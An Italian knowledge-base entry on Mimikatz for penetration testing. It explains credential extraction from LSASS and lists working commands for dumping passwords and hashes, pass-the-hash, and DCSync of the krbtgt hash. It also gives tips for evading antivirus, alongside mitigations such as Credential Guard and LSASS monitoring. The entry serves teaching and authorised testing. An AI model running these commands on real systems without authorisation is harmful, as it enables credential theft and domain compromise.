---
tipo: entita
tag: [windows, ad, tool]
fase: 3
fonti: 3
aggiornato: 2026-06-20
stato: maturo
aliases: ["Mimikatz"]
---

# Mimikatz

> **Nota etica**: usare solo su sistemi di cui si ha autorizzazione esplicita (lab, CTF, pentest con contratto). L'uso non autorizzato è reato.

## Cos'è
**Mimikatz** è lo strumento offensivo più noto per **estrarre credenziali** dalla memoria di Windows: password in chiaro, hash NT, ticket [[Kerberos]] e altro dal processo **LSASS**. Scritto da Benjamin Delpy, è diventato il riferimento per attacchi post-exploitation in [[Active Directory]] ed è incorporato in molti framework (Metasploit, Cobalt Strike, [[Impacket]]/[[CrackMapExec]]).

## Uso tipico
```text
# Da prompt con privilegi elevati
privilege::debug              # ottiene SeDebugPrivilege (necessario per LSASS)

sekurlsa::logonpasswords      # dump credenziali/hash dalla memoria
sekurlsa::ekeys               # chiavi Kerberos

# Pass-the-Hash: avvia un processo con l'hash NT di un utente
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash>

# Attacchi Kerberos
kerberos::list                # ticket in memoria
lsadump::dcsync /user:corp\krbtgt   # DCSync: estrae l'hash di krbtgt
```

## Quando si usa
- **Post-exploitation** dopo aver ottenuto privilegi di amministratore locale.
- Raccolta hash per [[Pass-the-Hash]] e [[Lateral Movement|movimento laterale]].
- Estrazione dell'hash di **krbtgt** (via DCSync) per forgiare un **Golden Ticket**.

## Note e trucchi
- Richiede privilegi di amministratore locale / SYSTEM per leggere LSASS.
- Spesso bloccato da AV/EDR: si usano versioni offuscate, esecuzione in memoria, o l'alternativa **`lsassy`/comsvcs.dll** per dumpare LSASS e processarlo offline.
- **Credential Guard** di Windows isola LSASS e neutralizza buona parte di queste tecniche.

## Mitigazione e difesa
- Abilitare **LSA Protection (RunAsPPL)** e **Credential Guard**.
- Limitare gli amministratori locali; usare [[LAPS]] per password locali uniche.
- Monitorare l'accesso a LSASS (Sysmon Event ID 10) e gli eventi di DCSync.

## Collegamenti
- [[Pass-the-Hash]]
- [[Kerberos]]
- [[NTLM]]
- [[Lateral Movement]]
- [[Active Directory]]
- [[LAPS]]

## Fonti
- Mimikatz (repository ufficiale): https://github.com/gentilkiwi/mimikatz
- HackTricks — Mimikatz: https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz
- MITRE ATT&CK T1003 — OS Credential Dumping: https://attack.mitre.org/techniques/T1003/
